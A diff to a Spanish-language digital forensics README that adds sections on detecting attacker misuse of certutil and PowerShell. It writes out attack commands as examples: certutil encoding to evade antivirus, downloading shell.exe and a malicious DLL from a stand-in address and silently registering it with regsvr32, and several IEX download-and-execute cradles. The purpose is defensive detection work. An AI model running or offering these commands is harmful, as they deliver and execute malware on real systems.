@@ -92,7 +92,9 @@ Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense
     - [▶️ SANS DFIR - Posters \& Cheat Sheets](#️-sans-dfir---posters--cheat-sheets)
 - [📓 Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense](#-detección-de-técnicas-de-evasión-en-sistemas-siem-soc-y-anti-forense)
   - [✅ Windows](#-windows-1)
-    - [▶️ Comando Windows: net y net1](#️-comando-windows-net-y-net1)
+    - [▶️ Comando Windows: "net" y "net1"](#️-comando-windows-net-y-net1)
+    - [▶️ Detección de técnicas maliciosas realizadas a través de "certutil"](#️-detección-de-técnicas-maliciosas-realizadas-a-través-de-certutil)
+    - [▶️ Detección de descarga de ficheros realizadas a través de PowerShell (Invoke-WebRequest, Invoke-RestMethod, BitsTransfer)](#️-detección-de-descarga-de-ficheros-realizadas-a-través-de-powershell-invoke-webrequest-invoke-restmethod-bitstransfer)
     - [▶️ Post-Explotación - PrivEsc con scmanager](#️-post-explotación---privesc-con-scmanager)
     - [▶️ DLL Hijacking *cscapi.dll*](#️-dll-hijacking-cscapidll)
     - [▶️ Otras técnicas de ejecución de CMD o PowerShell](#️-otras-técnicas-de-ejecución-de-cmd-o-powershell)
@@ -2616,13 +2618,77 @@ FTK (Forensic Toolkit) de Exterro permite recopilar, procesar y analizar datos e
 
 ## ✅ Windows
 
-### ▶️ Comando Windows: net y net1
+### ▶️ Comando Windows: "net" y "net1"
 
 El comando "net1" funcionará igual que el comando "net".
 ```cmd
 net1 accounts
 net accounts
 ```
+
+### ▶️ Detección de técnicas maliciosas realizadas a través de "certutil"
+
+El comando "certutil" puede ser utilizado por un actor malicioso para realizar diversas acciones maliciosas. Es una buena postura de seguridad configurar reglas preventivas y alertas para detectar estas técnicas.
+
+Ofuscación: Codifica y descodifica ficheros a través de certutil, evitando así la detección por motores antimalware en un primer análisis estático del fichero. 
+```cmd
+certutil -encode .\malware.exe bypass.txt
+certutil -decode .\bypass.txt malware.exe
+```
+
+Descarga de ficheros desde una dirección URL a local a través de certutil.
+```cmd
+certutil.exe -urlcache -split -f http://192.168.1.10/shell.exe shell.exe
+```
+
+Descarga de una dll maliciosa ofuscada previamente en un formato txt, decodifica y convierte la dll maliciosa a un formato de librería dll, con regsvr32 registra en modo silencioso la librería dll en el sistema.
+```cmd
+certutil.exe -urlcache -split -f http://192.168.1.10/malwaredll.txt malwaredll.txt
+certutil -decode .\malwaredll.txt exploit.dll
+regsvr32 /s /u .\exploit.dll
+```
+
+### ▶️ Detección de descarga de ficheros realizadas a través de PowerShell (Invoke-WebRequest, Invoke-RestMethod, BitsTransfer)
+
+Existen multitud de técnicas para la descarga y ejecución de ficheros a través de PowerShell, estas técnicas son comunes por los actores maliciosos para poder transferirse malware a una máquina previamente comprometida o con acceso limitado o través de máquinas de salto para ejecutar después técnicas de post-explotación o movimiento lateral. Es interesante conocer las técnicas más comunes y añadir reglas de detección.
+
+Invoke-WebRequest (IWR) e Invoke-Expression (IEX)
+```ps
+Invoke-WebRequest -Uri 'https://domain.com/myfile.ps1' -OutFile "C:\temp\myfile.ps1"
+
+IEX (New-Object Net.WebClient).DownloadString('URL')
+
+Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | IEX
+
+IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing)
+
+Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | Select-Object Content | IEX
+
+IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing).Content
+```
+
+Invoke-RestMethod (IRM) e Invoke-Expression (IEX)
+```ps
+Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt' | IEX
+
+IEX (Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt')
+```
+
+BitsTransfer synchronously
+```ps
+Start-BitsTransfer 'https://domain.com/myfile.ps1' -Destination "C:\temp\myfile.ps1"
+```
+
+BitsTransfer asynchronously
+```ps
+Start-BitsTransfer 'https://domain.com/myfile.ps1' -Destination "C:\temp\myfile.ps1" -Asynchronous
+```
+"BitsTransfer asynchronously" agrega un nuevo trabajo del servicio de transferencia de bits en segundo plano, esto es persistente incluso si la sesión de PowerShell se cierra. Para ver los trabajos en cola se usa "Get-BitsTransfer" y para completar el trabajo y descargar el archivo "Complete-BitsTransfer".
+```ps
+Get-BitsTransfer -Name "TestJob1" | Complete-BitsTransfer
+```
+
+- Más info: https://github.com/adrianlois/scripts-misc/tree/main/07.PS-IEX-WebRequest-WebClient-BitsTransfer
 
 ### ▶️ Post-Explotación - PrivEsc con scmanager
 LPE (Local Privilege Escalation) persistente y sin uso de archivos usando sc.exe otorgando permisos del SCM (Service Control Manager).
